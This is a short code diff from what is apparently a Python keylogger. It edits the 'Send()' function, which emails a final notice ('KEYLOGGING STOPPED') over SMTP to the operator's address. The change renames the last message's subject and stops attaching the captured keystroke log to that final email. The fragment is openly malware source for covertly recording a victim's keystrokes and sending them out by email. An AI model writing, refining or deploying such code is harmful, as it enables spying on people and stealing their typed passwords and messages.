@@ -33,8 +33,8 @@ def Send():
         msg = MIMEMultipart()
         msg['From'] = email
         msg['To'] = email
-        msg['Subject'] = 'Key #{}'.format(count+1)
-        msg.attach(MIMEText('{}\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'.format(ReadLogFile())))
+        msg['Subject'] = 'Key #{}'.format('LAST')
+        msg.attach(MIMEText('\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'))
         smtp.sendmail(email, email, msg.as_string())
         smtp.close()
         sys.exit(0)
